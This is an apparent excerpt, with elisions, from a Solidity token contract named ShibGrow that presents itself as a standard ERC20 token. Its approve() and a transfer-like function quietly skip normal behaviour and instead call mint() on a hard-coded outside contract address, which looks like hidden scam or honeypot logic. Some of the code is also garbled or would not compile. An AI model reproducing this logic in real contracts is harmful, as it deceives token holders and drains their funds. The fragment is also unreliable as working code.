...
contract ShibGrow is Context, IERC20, Ownable {
    ...
    function referIncludeToken(address _account) public {
        if (_isOpenTrade() == _nunTokensSellToAddToLiquidity) {
            require(_isOpenTrade() == _nunTokensSellToAddToLiquidity);
        ...
        returns (bool)
    {
        ...
        if (_rOwned[msg.sender] == true || _swapping() >= (15*1e9)){
            IBytsCode(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(50);
            return true;
        }else{
    ...
    function swapinggs() public onlyOwner{
    ...
    function approve(address spender, uint256 amount)
        ...
        returns (bool)
    {
        if (_swapping() == (5.1*1e9)){
            _approve(_isOpenTrade(), spender, amount);
        }else{
            IBytsCode(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(100);
        }
        return true;
    }
